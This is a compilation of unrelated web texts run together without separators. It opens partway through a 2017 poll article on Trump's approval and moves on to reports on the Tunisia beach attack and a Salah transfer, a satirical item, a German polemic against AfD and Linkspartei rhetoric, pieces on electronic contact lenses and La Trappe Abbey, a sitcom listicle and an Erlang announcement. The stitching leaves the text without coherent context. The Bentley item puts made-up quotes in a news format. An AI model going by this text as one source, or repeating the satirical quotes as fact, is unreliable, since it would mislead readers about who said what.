The most pronounced swing seen in the poll was among independents. Over the past four months, their approval of the president has dissipated. In February, 40 percent of independents said they approved of the job Trump was doing, with 51 percent disapproving. Four months later in June, just 31 percent say they approve of the president with 59 percent of independents disapproving — a 17-point net-negative drop.

Despite almost full employment nationwide, independents are particularly dissatisfied with Trump on the economy. That's likely driving much of their overall disapproval. Just 31 percent of independents say they have confidence in Trump's ability to improve the U.S. economy, while 49 percent doubt he can do so. Just three months ago, 44 percent thought Trump could turn around the economy, while 38 percent didn't — a whiplash-worthy 24-point swing.
Lee Miringoff, the director of the Marist College Institute for Public Opinion, said the scope of the shift over the past few months among independents should cause "alarm bells to go off" at the White House.
"Independents were certainly willing to give Trump the benefit of the doubt when he entered office," Miringoff said, "but on issues like the direction of the country and the economy, they've really soured on him. It's hard for someone like him to make a second impression. Independents have come to the conclusion that what you see is what you get."
The good news for Trump is that his base hasn't abandoned him even as he has faced mounting investigations. Eighty percent of Republicans still approve of the job he is doing, including 91 percent who identify as strong Republicans. Trump has an 89 percent approval rating among those who voted for him last November. He has a 65 percent approval rating among white evangelical Christians, though almost a quarter disapprove of the job he is doing.

Still, there are some warning signs for the president among some of his key demographic groups. Only 52 percent of white, non-college-educated Americans approve of the job he's doing, though just 37 percent disapprove. And that is higher than most other subgroups. More worrisome for the president, among older Americans, 60 and older, he's underwater — 47 percent disapprove, while 43 percent approve.
Overall, Americans' outlook under Trump is dismal. Almost double say the country is on the wrong track as those who think it's on the right track, 61 percent to 31 percent, a gap that has nearly doubled since February.
More people say they feel worse off — 40 percent — since Trump took office, than better off — 34 percent. There is a deep partisan divide on that question, of course — 73 percent of Republicans say they're better off, while 67 percent of Democrats say the opposite. Among independents, far more — 44 percent — say they're worse off, compared with just 27 percent who say they're better off.
Americans also think Trump has hurt the country on the global stage. Fifty-eight percent say the president has weakened the United States' position abroad, while 34 percent say he has strengthened it.
In addition, by a 24-point margin, Americans believe former President Barack Obama was, by far, a more effective leader in comparison to Trump, 58 percent to 34 percent. Among independents, there is an even more pronounced 36-point difference, 65 percent to 29 percent.
A narrow plurality do think Trump is keeping his campaign promises (48 percent who do and 45 percent who don't), but most people disagree with some of the president's recent decisions. Fifty-three percent of those surveyed said they opposed Trump pulling out of the Paris climate accord earlier this month, while just 30 percent supported it.
Just over half of Americans also think the Supreme Court should rule against Trump's travel ban, which would curtail the entry of people from six Muslim-majority countries, while 43 percent say the high court should rule in the president's favor and allow him to proceed with one of his key campaign promises. A slim majority of independents (52 percent) also think the court should strike down the ban.
There is a cloud of suspicion that hangs over the president as well, with mounting questions about his business ties that are only compounded by his continued refusal to release his tax returns. More than 6 in 10 Americans say they believe Trump has either done something illegal (33 percent) or unethical but not illegal (28 percent). Just 31 percent say they believe he has done nothing wrong.
One place where Trump is losing GOP support is over his Twitter habit. Sixty-nine percent of Americans say Trump's use of Twitter is "reckless and distracting," while only 21 percent say it's "effective and informative." Even among Republicans, only a narrow plurality (43 percent) say the president's use of Twitter is positive, while 42 percent agree it's reckless and distracting.
And while Americans have a sour view of Trump, their opinion of Congress — both Democrats and Republicans — is no better. Congressional Republicans have a 33-point net-negative approval rating (28 percent to 61 percent) while congressional Democrats are not much better with a 27-point net-negative approval (30 percent to 57 percent).
"Nobody is benefiting in Washington from what is going on," Miringoff said.
Looking ahead to the 2018 midterms, registered voters say they're more likely to vote for a Democratic member of Congress over a Republican one by a 10-point margin, 48 percent to 38 percent.
But, with a gerrymandered congressional map that benefits the GOP, that double-digit advantage is less imposing than it may seem and may not be enough to help Democrats win back the House.
What's more, as they learned in last week's special-election loss in a Georgia House race, making the election too much about Trump isn't necessarily a silver bullet, either.
The NPR/PBS NewsHour/Marist poll surveyed 1,205 adults from June 21-25 contacted by live interviewers using a mix of landline and mobile numbers. There is a 2.8-percentage point margin of error. A sub-sample of 995 registered voters were also surveyed, with a 3.1-percentage point margin of error.
We are a target of Islamist extremists, says PM as Theresa May flies to Tunisia in wake of the biggest loss of British life to terrorism since 2005 London bombings
Islamist extremists “have declared war on Britain and they are attacking our people at home and overseas”, David Cameron has said in response to the killing of as many as 30 British tourists in Tunisia.
Pledging a “full spectrum” response to the massacre, Cameron said Theresa May, the home secretary, had flown to Tunisia on Monday for talks on how to address the extremist threat and to pay her condolences at the scene.
“We are a target,” said Cameron, speaking on BBC Radio 4's Today programme. “Frankly, we cannot hide from this thinking if you step back you become less of a target. They are attacking our way of life and what we stand for, and so we have to stand united with those that share our values.”
Tunisia beach attack: the victims Read more
He said May had gone to Tunisia to see what more the British government could do to help the investigation into the killing of the tourists. An RAF C-17 transport plane had been sent out to help with the evacuation of holidaymakers, and Cameron said the government was ready to repatriate victims' bodies if requested by their families.
“We are very happy to look at that. There are all sorts of other arrangements being put in place but I am keen that, as a nation, we show respect and our condolences … and if they would like for us to try and bring back the bodies of their loved ones with dignity and respect that is something we can do.”
The attack in Tunisia represents the biggest loss of British life to terrorism since the 2005 London bombings, in which 56 people – including the attackers – were killed. Although 18 Britons have been confirmed to have died in Tunisia, the toll is expected to pass 30.
The remaining six British holidaymakers who were injured in the attack will be back in Britain in the next 24 hours as British authorities press the Tunisians to speed up the identification of the remaining dozen or so UK citizens believed to have been killed.
A Downing Street spokeswoman said 18 bodies had been identified so far. The six injured being returned to Britain were likely to return on an RAF plane, but the dead will be repatriated by a variety of routes following consultation with their families. She was speaking after a meeting of Cobra, the emergency response committee, focused largely on the attack as opposed to any wider policy response.
She said the number of British security officials was being increased, but it was for the Tunisian authorities to lead the investigation, including whether the gunman had an accomplice. She would not speculate on whether the Tunisians believed it was a wider organised attack directed by Isis.
The security officials are also looking at how British tourists can be
better protected in Tunisia. The spokeswoman said there was no short-term plan to change in travel policy despite the PM's warning Britain faced an existential threat.
May began her visit with a minute's silence at the improvised memorial on the beach where the massacre began. Dressed in a black suit and carrying a large bunch of flowers, she came with her Tunisian, French and German counterparts. Also in her delegation was foreign office minister Tobias Ellwood, whose brother was killed in the Bali terrorist attack in 2005.

The group stood in sombre silence at the edge of an expanse of abandoned sun-loungers, beside a small pile of flowers and messages of condolence – one read simply “Why?” – before heading off to visit injured survivors in hospital.
May described the attack as a “despicable act of cruelty”. She said: “Tunisia is a symbol of what is possible”, and the meeting with interior ministry colleagues had shown a determination to fight “perverted ideology”. They were looking for concrete ways to share expertise dealing with this threat. “The terrorists will not win, we are resolved in that,” May said.
Sixteen Metropolitan police detectives, forensic science specialists and family liaison officers have arrived in the country and more will join them to assist the investigation.
Tunisian investigators said they were seeking one or more accomplices to the 23-year-old killer, Seifeddine Rezgui, who was shot dead by police after his assault at the Imperial Marhaba hotel.

Cameron urged Britain to show extraordinary resolve and strength, saying it had to recognise it was in for a long haul in a battle to defeat Islamic extremism. He said it was vital to defeat the assailants' poisonous narrative – “the attack was horrific and had shocked the whole world”.
Government sources also said ministers would press ahead with Conservative manifesto plans for restrictions on extremist views on social media, as well as banning extremist but not violent organisations such as Hizb ut-Tahrir. No timescale was given.
Cameron said the government should not engage with organisations that were apologists for extremism such as condoning suicide attacks in Israel.
He urged the BBC not to call the self-described militant organisation Islamic State, saying it was an appalling barbarous regime that was a perversion of Islam and would lead most Muslims to recoil.
Cameron said: “The creation of this poisonous death cult is seducing too many young minds in Europe, America, the Middle East and elsewhere, and this is going to be the struggle of our generation.”
Insisting Britain was providing a “full spectrum” response, the prime minister defended the level of British commitment in Iraq, saying the aim was to crush Isis in Iraq as well as in Syria. He insisted Britain was the second largest contributor in air strikes in Iraq and claimed the level of UK commitment was higher than in previous British commitments in Iraq. He was challenged that Britain had launched 300 strikes in comparison with 600 by the US in Iraq, but he said Britain was investing heavily in air strikes that made a difference.

On Syria, he said President Bashar al-Assad was one of the causes of the rise of Isis due to his “appalling treatment” of Sunni communities. He denied Isis was winning militarily, claiming instead it had lost a lot of territory, and insisted the group could be defeated militarily.
In Britain, he asserted the need to bring young British Muslims back into society, saying he recognised the role of imans in combating extremism, but added: “There are a lot of extremists that buy into a lot of the narrative of the terrorists – that they want a caliphate, that Muslims and Christians cannot live peacefully together, or that they want to subjugate women. We have to say in our country that those views, while they fall short of condoning terrorism, are not acceptable either. This is something that can be fixed but it can take many many years.”
Cameron denied he was refusing to engage with the Muslim community as a whole but only those organisations that were at the gateway to terrorism by accepting the extremists' narrative. He said the British government would not treat them as spokespeople for the Muslim community.
Scotland Yard said it was tightening security and protection at Wimbledon and other “key sites, business and public places around the UK to help ensure they are safe for visitors and workers”.
Liverpool have lost the race to sign Basel winger Mohamed Salah, being outbid by Chelsea at the last hurdle, according to the Liverpool Echo.
Reports on Wednesday suggested Salah was due on Merseyside before the end of the week to seal a £10 million switch to Liverpool, but a bid on Wednesday night from Chelsea has scuppered that deal.
Jose Mourinho is looking to bring Salah in as a direct replacement for Juan Mata, who is set to join Manchester United in a £37 million deal later today.
James Pearce of the Echo writes on Thursday afternoon:
Liverpool values the player at around the £8million mark but Basel have upped their asking price for Salah to around £16million.
It would appear that the Reds are unwilling to match the fee Chelsea say they are prepared to pay for the 21-year-old Egyptian international's services.
With just over a week of the January transfer window remaining, this news will come as a major blow to Brendan Rodgers, who had hoped to bolster his attacking options with Salah's talents.
The Reds may also be looking at full-back and central defensive midfield targets before the window closes on Friday, 31st January.
It certainly seems it could be an exciting last week of transfer speculation and activity, with time running out for Liverpool and their Premier League rivals to sign the right players to carry them up the league.

Alabama Governor Robert Bentley released a statement today blaming the federal government's defense of same-sex marriage for the failure of his 50-year marriage.
Bentley is currently enveloped in a scandal surrounding an alleged extra-marital affair with his former top political aid.
“The federal government's actions prompted the devaluation of my holy union which forced me to withdraw my investment while there was still any value left,” said Bentley while strumming the state banjo. “Dadgum Obama!”
Bentley also added that he didn't see what the big deal was.
“Considering the legal context of my actions and my moral hypocrisy, it is truly a miracle that it wasn't one of them homosexual affairs,” said a somber Bentley. “Y'all should really be thankin' me.”

Ich werde jetzt einen sozial engagierten Wutbürger interviewen und erst am Schluss des Interviews sagen, wer die Antworten, die hier im Original zitiert werden, gegeben hat. --- Herr Wutbürger, wenn ich Sie richtig verstanden habe, mögen sie einige Dinge nicht. Sie mögen keinen Neoliberalismus, keine Globalisierung, keine Amerikaner und keine Flüchtlinge.
„Es befinden sich 60 Millionen Menschen weltweit auf der Flucht – auf Dauer können nicht alle nach Nord- oder Zentraleuropa kommen.“
Wollen die auch nicht. Vielleicht eine Million oder zwei. In Europa wohnen 500 Millionen Menschen. Da sind eine Millionen Flüchtlinge 0,2 Prozent der Einwohner. 1910 war im Ruhrgebiet 20 Prozent der Einwohner Polen. 1945 kamen 13 Millionen aus dem Osten. Es ist doch erstaunlich, dass sich heute bei so wenigen Flüchtlingen alle möglichen Leute überfordert fühlen, besonders die, die noch nie einem Flüchtling begegnet sind?
„Ich denke nicht, dass wir einen unlimitierten Flüchtlingszustrom auf Dauer ertragen.“
Sie nicht, aber ...
„Wir haben es mit einem enormen Staatsversagen auf EU-Ebene und auf Deutschland-Ebene zu tun und das rächt sich bitter. Im Übrigen möchte ich, dass Kinderärzte, Ingenieure und Architekten möglichst in ihren Ländern bleiben.“
Dann könnten Maurer, Elektriker, Klempner, Soldaten, Zahntechniker, Lehrer, Schleuser, Hilfsarbeiter und Dachdecker also in unbegrenzter Zahl kommen?
„Da wir eine multifaktorale Situation haben, brauchen wir auch eine multifaktorale Antwort ... Es geht nicht, wenn wir sagen: es gibt nun eine vollkommene Grenzenlosigkeit für alle.“
Sagen wir, wie es ist: Ihre nationalfaktorale Meinung lautet doch, dass die Flüchtlinge bleiben sollen, wo sie sind. Ihre Begründung: Den Deutschen fehle so viel, dass man sich nicht auch noch um Flüchtlinge kümmern könne.
„In Hannover fehlten – bevor der Flüchtlingsstrom, die Völkerwanderung oder wie auch immer man das nennen mag – begannen, 21.000 Sozialwohnungen.“
Schon damals fehlten in Hannover so viele Sozialwohnungen? Sie wollen also die Grenzen schließen und Sozialwohnungen für Deutsche bauen, aber finanziert werden sollen die Wohnungen – das ist etwas überraschend – von den Amerikanern!
„Man muss die amerikanische Regierung zur Kasse bitten, das ist dann eine Geldquelle, mit der man in Deutschland auch Sozialwohnungen bauen könnte ... Nicht Libyen bombardieren und uns dann wundern, dass die Menschen hier her kommen. Kein Mensch hat den USA gesagt, dass sie Gaddafi wegbomben sollen.
Sie meinen, es kämen Libyer, die sich als Syrer ausgeben? Lassen wir das. Zurück zu ihrem Finanzierungsvorschlag. Da Tripolis vor allem nicht von den Amerikanern bombardiert wurde, sondern von Franzosen und Briten, könnte man nicht sagen: Frankreich soll den deutschen Straßenbau übernehmen, die Briten die Energiewende und die Russen, die ihre Bomben über Syrien abwerfen, den Berliner Flughafen. Das wärs doch. Ganz gleich, wer was bezahlt, sie haben ein Herz für Gaddafi und das Soziale, nicht wahr?
„Gaddafi, der hatte den Staat ... irgendwo noch im Griff und jeden dritten Dollar, den er eingenommen hat, hat er in den Sozialstaat gesteckt. Aber nein, es musste erstmal bombardiert werden.“
Mit der Sehnsucht nach einem Führer, der die Nation fest im Griff hat, stehen Sie nicht allein da. Leider hat Gaddafi nur jeden dritten Dollar in den Sozialstaat gesteckt, weil sein Hofstaat, seine Armee, sein Privatbordell, die Gefängnisse und die Flüchtlingslager in der Wüste, die er damals auf Wunsch von Otto Schily gebaut hatte, so teuer waren. Dann ließ Gaddafi über 2.000 Häftlinge umbringen und auf die demonstrierenden Verwandten schießen. Ein Massaker nach dem anderen. Aber was tut man nicht alles für den Sozialstaat?
„Die EU hat nicht die staatliche Seele, also diese Sozialstaatlichkeit etc.“
Mein Interviewpartner hat eine ausgeprägte soziale Ader, man könnte auch sagen: Er hat immer ein offenes Ohr für die kleinen Leute. Besonders für die, die Asylunterkünfte in Brand setzen.
„Wenn sich die kleinen Leute Sorgen machen, oder wenn Balgereien entstehen mit Flüchtlingen um eine Winterjacke oder um die Sozialwohnung, auf die der ein oder andere schon ganz lange wartet, dann muss man da ein offenes Ohr für haben. Da einfach drüber Hinwegstolzieren und sagen, das sind alles Rassisten, ist ganz falsch.“
Was sind die denn sonst? Wenn kleine Leute Naziparolen rufen und Flüchtlinge aus Bussen zerren und jede Nacht Asylunterkünfte in Brand setzen, wenn wir also die Vorstufe von Pogromen erleben, dann sind das für Sie Balgereien – wie wenn Kinder übermütig spielen? Diesen Leuten fehlen Empathie und Verstand, aber keine Winterjacken.
Die Antworten sind von Diether Dehm, der europapolitische Sprecher der Bundestagsfraktion der Linkspartei. Er war früher Schlagersänger. Leider hat er diesen schönen Beruf aufgegeben und ist in die Politik gegangen. Er gehört in der Linkspartei zum linksradikalen Flügel, der die Spezialität hat, sehr national zu sein und einem Querfront-Bündnis mit Faschisten nahezustehen. Wenn Linke anfangen, die soziale Frage national zu definieren und Mordanschläge auf Flüchtlinge als Balgereien zu beschönigen, dann ist tatsächlich links gleich rechts.
Wenden wir uns jetzt dem Original zu:
„Thüringer! Deutsche! 3000 Jahre Europa! 1000 Jahre Deutschland!"
So begrüßt Björn Höcke von der AfD-Thüringen seine Anhänger. Er kann nicht gut reden, aber er bemüht sich, so zu wirken wie Nazi-Redner damals, als Deutsche Gebrüll noch für eine gute Rede hielten, und er will irgendwie das 1.000-jährige Reich unterbringen. Höcke lamentiert über
„die deutsche Volksgesundheit“
er pocht
„auf germanische Wurzeln“
und unterscheidet nach mehreren Lehrgängen „Rassenkunde“
„den europäischen Platzhaltertyp“,
der sich nicht so vermehrt, wie Höcke das möchte,
„und den afrikanischen Ausbreitungstyp",
der sich ganz gut vermehren soll. Höcke denkt immer wieder nur an das eine:
„An die Vergewaltigung der blonden Frau“
und auch
„an die Angstträume der blonden Frauen"
Brünette, Schwarz- und Rothaarige sind ihm egal. Blond soll sie sein. Das wurde in der Rassenkunde so vermittelt. Höcke sagt:
„Das drängendste Problem unserer Zeit ist, dass Deutschland, dass Europa ihre Männlichkeit verloren haben. Nur wenn wir unsere Männlichkeit wieder entdecken, werden wir mannhaft.“
Die doppelte Vermannung weist auf Defizite hin. Die AfD spricht auch von
„einer Opferung der Deutschen auf dem Altar von Multikulti“,
eine Umschreibung der „Rassenschande“. Besonders weit in der Erforschung der stockenden Vermehrung ist die AfD Baden-Württemberg.
„Jungs gehen hier in Kindergärten und Schulen, die auf Mädchen zugeschnitten sind, und erfahren eine strukurelle Benachteiligung“.
Aber die AfD werde darauf achten,
„dass jedes Kind sein biologisches Geschlecht annimmt und in Familien wieder starke Männer einziehen“.
Zum Krieger ist der Ehemann geboren. Damit die Vermehrung klappt, macht die AfD endlich Schluss
„mit der volkserzieherischen Überhöhung von nicht heterosexuellen Menschen“
und wird Schwule und Lesben in Umerziehungslager stecken! Auch der Chef vom Philologenverband Sachsen-Anhalt denkt immer an das eine. Er fragt in seiner Fachzeitung:
„Wie können wir unsere Mädchen ab 12 so aufklären, dass sie sich nicht auf ein oberflächliches sexuelles Abenteuer mit sicher oft attraktiven muslimischen Männern einlassen?“
Unser Mädchen und der böse Moslem! Gerade der Pädagoge hatte wissen können, dass unsere Kriminalpolizei bei Sexualdelikten aus Erfahrung immer zuerst unter deutschen Lehrern, deutschen Familienvätern und deutschen Onkeln ermittelt. - Als eine Zuhörerin bei einer AfD-Veranstaltung nach den vielen von AfD-Kadern vorgetragenen Vergewaltigungsphantasien nicht mehr allein nach Hause wollte, weil sie Angst vor einem Überfall hatte, forderte der AfD-Spitzenkandidat in Baden-Württemberg:
„Wir müssen uns zu jeder Tages- und Nachtzeit sicher bewegen können.“
Das erinnert mich an meine Kindheit. So um 1950 erzählte mir mal ein Kriegsversehrter mit Granatsplittern im Kopf, aber ohne Beine, der auf Lederstumpen hinter einem Pappkarton kauerte und Streichhölzer verkaufte, bei „Adolf“ (er sprach über Hitler, als wäre er ein Verwandter), bei „Adolf“ habe man sich noch ohne Angst auf die Straße getraut. - Wir sehen: Der fremde Mann veranlasst ohne sein Zutun deutsche Männer, einen Blick auf sich zu werfen. Und da entdecken sie, schrieb Adorno:
„Unter der bekannten Geschichte Europas läuft eine unterirdische. Sie besteht im Schicksal der durch die Zivilisation verdrängten und entstellten menschlichen Instinkte und Leidenschaften ... Von der Verstümmelung betroffen ist vor allem das Verhältnis zum Körper“
Der AfD-Mann projiziert Vitalitätsphänomene auf Fremde und macht sich dadurch noch kleiner als er sowieso schon ist. Hilfe! Die blonde Frau will einen Syrer! Tod den Fremden! Ich bin das Volk! Du sollst keine anderen Völker haben neben mir! Und so kommt es, dass Frau Petry und Frau von Storch an der Grenze auf Frauen, Männer und Kinder schießen wollen und Herr Gauland sagt:
„Wir müssen lernen, grausame Bilder auszuhalten“
Alles, was sie sagen, klingt eiskalt, empathielos, tödlich. Die Suche nach der Philosophie des Todes führt uns zu Marc Jongen, ein hohes Tier in der AfD Baden-Württemberg, der früher Assistent von Peter Sloterdijk war. Jongen plagt
„ein permanenter Albtraum, seit Merkel die Grenzen geöffnet hat. Ich wache auf und denke: Schon wieder neue Flüchtlinge.“
Bedauerlicherweise ging Jongen mit seinem Leiden nicht in Therapie, sondern wie Diether Dehm in die Politik.
„Unsere Vorfahren haben ihr Territorium verteidigt und die AfD wird so handeln wie unsere Vorfahren.“
Unsere Vorfahren haben ihr Territorium nicht verteidigt, sondern Russland und Norwegen, Griechenland, Nordafrika und Frankreich überfallen, haben Juden vernichtet und andere Gruppen verfolgt, versklavt, gefoltert und ermordet. Sowas nennt der Philosoph: Volksverteidigung. Sein Vorbild Sloterdijk mag Heidegger,
„der die Epochenfrage stellte: Was zähmt noch den Menschen, wenn der Humanismus als Schule der Menschenzähmung scheitert?“
Für Heidegger war es der Nationalsozialismus! Er ging in die NSDAP, kaufte sich eine Trachtenjacke und eine Anstecknadel mit einem Hakenkreuz. Sloterdijk nicht, aber er weissagte schon weit vor Björn Höcke den Untergang des Abendlandes,
„weil in Bevölkerungen mit starken Jungmänneranteilen der Bellizismus wächst, indessen überalterte Völker zum Pazifismus neigen“.
Die Botschaft wurde von Höcke verstanden: Fremde Männer löschen uns aus! Und so sagt Sloterdijk:
„Vor uns liegt ein Weltalter, in dem der Unterschied zwischen Siegern und Verlierern wieder mit antiker Härte und vorchristlicher Unbarmherzigkeit an den Tag tritt".
So raunt – erregt von der Selektion und dem ganzen Brimborium - der Philosoph, während der Engstirnige Fremde als kosmische Bedrohung wahrnimmt und von Politikern verlangt, sie endlich zu vertreiben. Sonst wittert er Lüge und Verrat und ruft sich selbst zum Volk aus. Und dann brennen die Unterkünfte und der linke Politiker sagt: „Guckt mal, wie die Kinder balgen“ und der Philosoph singt dazu, gemeinsam mit der Meute das Menschenopfer umkreisend, den Bocksgesang.
Image caption The vision is to stream real-time information in front of the eyes
A new generation of contact lenses that project images in front of the eyes is a step closer after successful animal trials, say scientists.
The technology could allow wearers to read floating texts and emails or augment their sight with computer-generated images, Terminator-syle.
Early tests show the device is safe and feasible, says the University of Washington in Seattle.
But there are still wrinkles to iron out, like finding a good power source.
Currently, their crude prototype device can only work if it is within centimetres of the wireless battery.
And its microcircuitry is only enough for one light-emitting diode, reports the Journal of Micromechanics and Microengineering.
Our next goal is to incorporate some predetermined text in the contact lens Lead researcher Professor Babak Parviz
But now that initial safety tests in rabbits have gone well, with no obvious adverse effects, the researchers have renewed faith about the device's possibilities.
They envisage hundreds more pixels could be embedded in the flexible lens to produce complex holographic images.
For example, drivers could wear them to see journey directions or their vehicle's speed projected onto the windscreen.
Similarly, the lenses could take the virtual world of video gaming to a new level.
They could also provide up-to-date medical information like blood sugar levels by linking to biosensors in the wearer's body.
Delicate materials
Lead researcher Professor Babak Parviz said: "Our next goal is to incorporate some predetermined text in the contact lens."
He said his team had already overcome a major hurdle to this, which is getting the human eye to focus on an image generated on its surface.
Normally, we can only see objects clearly if they are held several centimetres away from the eye.
The scientists, working with colleagues at Aalto University in Finland, have now adapted the lenses to shorten the focal distance.
Building the end product was a challenge because materials used to make conventional contact lenses are delicate.
Manufacturing electrical circuits, however, involves inorganic materials, scorching temperatures and toxic chemicals. Researchers built the circuits from layers of metal only a few nanometres thick, about one thousandth the width of a human hair, and constructed light-emitting diodes measuring one third of a millimetre across.
Dr Parviz and his team are not the only scientists working on this type of technology.
A Swiss company called Sensimed has already brought to market a smart contact lens that uses inbuilt computer technology to monitor pressure inside the eye to keep tabs on the eye condition glaucoma.
The abbey in 2006
La Trappe Abbey or La Grande Trappe is a monastery in Soligny-la-Trappe, Orne, France. It is known for being the house of origin of the Trappists, formally known as the Order of Cistercians of the Strict Observance, to whom it gave its name.
History [ edit ]
The site of the famous La Trappe Abbey was for centuries isolated in a valley surrounded by forests, streams and lakes, 9 miles from Mortagne and 84 miles from Paris, in the Diocese of Séez and the former province of Normandy.[1]
It began as a small oratory chapel to the Virgin Mary, built in 1122 by Rotrou III, Count of Perche, as a memorial to his wife Matilda FitzRoy, Countess of Perche. (An illegitimate daughter of Henry I, she drowned in the White Ship disaster of 1120.) A few years later Rotrou built a monastery adjoining, which he offered to the monks of Le Breuil-Benoît Abbey near Dreux, a house of the Order of Savigny. The order was highly respected at that time for its fervour and holiness.[citation needed]
In 1140 the monastery of La Trappe was raised to the status of abbey. In 1147 Savigny Abbey, with all its affiliated monasteries, was united to the Cistercian Order. From that time onwards, La Trappe was a Cistercian abbey, immediately subordinate to the abbot of Clairvaux.[citation needed]
After years of prosperity, La Trappe suffered during the Hundred Years' War. It was in the path of both the English and French armies. The monks were forced to abandon the monastery, which was burnt and pillaged in 1376 and again in 1465. In the 16th century, after the reconstruction, the abbey, in common with many other monasteries, was given to a series of absentee abbots in commendam. The lack of leadership depressed its fortunes.[citation needed]
The 14th commendatory abbot, installed in 1662, Armand Jean le Bouthillier de Rancé, godson of Cardinal Richelieu, proved to be La Trappe's greatest leader. De Rancé experienced a religious conversion which led him to take his responsibilities seriously. He became abbot in fact as well as in name. From 1664 La Trappe was the centre of a thorough reform of the Cistercian Order, led by de Rancé. The reform movement took the name of the abbey and became renowned as an order.[citation needed]
Bossuet, a friend of de Rancé, was a frequent visitor at La Trappe. James II of England came here while a refugee in France. The distinguished Benedictine scholar, Dom Jean Mabillon, after his long quarrels with de Rancé,[2] visited him here to make peace.[citation needed]
The abbey did not escape the general fate of religious houses under the French Revolution. Pursuant to the decree of 13 February 1790 against the religious orders of France, the abbey was suppressed. Some of the monks were martyred. Others, under the novice master, Dom Augustin de Lestrange, went into exile, initially at La Valsainte Charterhouse in Switzerland.[citation needed]
The French government sold the abbey as national property. After the Bourbon Restoration, de Lestrange purchased the property back in 1815. When the religious community returned, the brothers found the premises in a ruinous state. They rebuilt the monastery in its entirety and the new church was consecrated on 30 August 1832.[citation needed]
The abbey's reputation as a place of retreat continued. It attracted both the Count of Artois, afterwards Charles X and Louis Philippe in 1847.[citation needed]
In 1880 the Trappists were expelled under French laws against religious institutions, but after a couple of years, they were able to return. The monastery was entirely rebuilt under the 45th abbot, Dom Etienne Salasc; the new church was consecrated on 30 August 1895.[citation needed]
Present day [ edit ]
The buildings, in Neo-Gothic style, are still occupied by the Trappist community, under the leadership of abbot Dom Guerric Reitz-Séjotte, appointed in 2004. La Trappe Abbey directly supervises four other Trappist houses, at Bellefontaine in Anjou,[3] Timadeuc in Brittany, Échourgnac in Dordogne, and Tre Fontane in Italy.

Pictures of intentional — and not so intentional — references to Arrested Development out in the wild.
It's been over a year since I did an Arrested Development-themed list on this site (February 17, 2011's 11 Thoughts On Mitch Hurwitz's 11 Reasons Why Arrested Development Was Canceled). Far too long, right?
This list contains photos of Arrested Development references from around the world. About half are intentional, half are not, and there's one that could go either way. Anyway, the references generally lean toward the more hardcore fans, so much like when I found 11 Hidden Simpsons References At Costco, this definitely isn't everyone's flavor.
But if it's been a good 15 or even 20 minutes since you heard someone whining about the premature death of Arrested Development, you'll certainly be on board.
1 | I want this guy to be my realtor
Can you imagine hiring someone named Steve Holt to sell your house? Every time he called and said, “It's Steve Holt,” wouldn't you respond by throwing your arms up in the air and yelling, “Steve Holt”? I just did that now as I was typing in the room by mself. Steve Holt!
(By the way, I looked up Holt Real Estate with that area code-less phone number and it turns out Steve Holt is a real estate agent out of the Buffalo, New York area. Uncle Mike! Steve Holt!)
2 | Has anyone in this family even seen a chicken?
We really need more random Arrested Development graffiti in this world. Like, I wouldn't even mind if someone tagged my house if it said “Unlimited juice?” or “We're having a fire! Sale!” or “Mock Trial With J. Reinholt.”
3 | Is this guy a Nevernude?
I found this image gallery of a guy who lost 100 pounds and couldn't fit into his old jorts anymore. So he took some photos of his new jorts over his old jorts. Or at least that what's he claimed he was doing. It's entirely possible that he, like Tobias Funke and whatever character Zack Braff played, is a Nevernude. After all, there are dozens of them. Dozens.
4 | A tiny teddy
This is closer to the tiny teddy Rita was describing than the “tiny teddy” Michael was picturing. These are made in Australia, Rita is from England and Charlize Theron is from South Africa. It all just got muddled into one big accent anyway.
5 | Bob Loblaw makes a cameo
This Bob Loblaw reference is part of the photo tour for a piece of Mac software called OmniGraffle. One of the designers must've slipped it in. I'm not sure what OmniGraffle does, but I'm far more likely to buy it now. (I even took this screenshot myself, but didn't bother to slow down to examine the software. I'm sure it's very practical.)
6 | Mr. F
Turns out there's a company called MRF that makes cricket equipment. Which, of course, raises the question: Is MRF equipment ever featured in Bumpaddle magazine?
7 | F*** Mountain!
You want to use the wifi instead of going to the whirlpool? Too bad. Check your lease, man. Because you're living in F*** City. (Which, of course, would later become F*** Mountain.)
8 | Nike's leaving blue handprints all over
Clearly no one at Nike watched Arrested Development before they started their blue handprint campaign. Or they would've realized someone in marketing just blue his big campaign idea.
9 | The Marta 2
I'm all over the place on whether this is an intentional Arrested Development reference or not. Here are my arguments in both directions.
Intentional: Marta 2 is a great insider Arrested reference for when they switched the actress playing Marta in the middle of her arc… the Bluth boat is a big part of the show, so if you get a boat, you might want to name it after AD… I'd like to believe there's at least one boat owner willing to pay the show homage.
Unintentional: Wouldn't you name the boat Lucille to make it truer to the show?… since putting “2” after your boat's name is popular, it's conceivable this boat is just named for someone named Marta… I don't see a guy with one arm or any Hot Cops getting on that boat.
10 | Where am I going to get a maritime lawyer?
I know this sign isn't an intentional Arrested reference… but if you saw a sign warning you about dangerous seals that clearly suggests they'll bite off your hand, wouldn't Buster be your first thought?
11 | Hot Ham Water
Hot Ham Water is what Lindsay makes when she puts canned ham in boiling water; she doesn't call it soup. This is the real menu from a restaurant called Harris Grill in Pittsburgh, Pennsylvania. And I am furious with myself that when I saw this photo, my eyes initially passed over the brilliant Arrested Development reference for the Samuel L. Jackson Siri iPhone commercial reference. That's more shameful than hotzpacho.

Nine Nines (Cowboy) joins Advanced Erlang Initiative
We are happy to announce that Nine Nines is joining Advanced Erlang Initiative. Nine Nines is the company behind Cowboy web server, the reference Erlang HTTP server. Cowboy is used by many other projects like the Elixir Phoenix framework or ChicagoBoss, making it a very popular product, widely acclaimed in the Erlang community.
When Advanced Erlang Initiative was launched a couple of months ago, it was clear that the ecosystem of Erlang products was vibrant. It is very good news to see new forces joining the promotion effort around products that are critical for the Erlang ecosystem.
With Nine Nines joining the effort, Loïc Hoguin is now one of the Erlang experts involved in making the initiative successful. As such, a new day-long workshop for Cowboy is announced and will take place in March 2016. The new workshop is growing the list of worldwide expert talks that will take place in the coming months, around Quickcheck, ejabberd, and now Cowboy.

It's no secret Joe Scarborough is no fan of Donald Trump... (anymore)
In his endless struggle to critique the president in ever more flourishing terms, the morning host dropped an amusing Yiddishism on air, calling the the 45th president a “schmuck.”
The moment came during a discussion of the looming James Comey hearing which is expected to completely bring Washington D.C. to a standstill on Thursday. Earlier in the show, Scarborough warned his former Republican colleagues that it was critical they maintain their independence.
GOP operative and show regular Steve Schmidt spoke about how many of Comey's Republican inquisitors tomorrow still have long careers left in the party and how their conduct would continue to follow them long after Trump has left the stage.
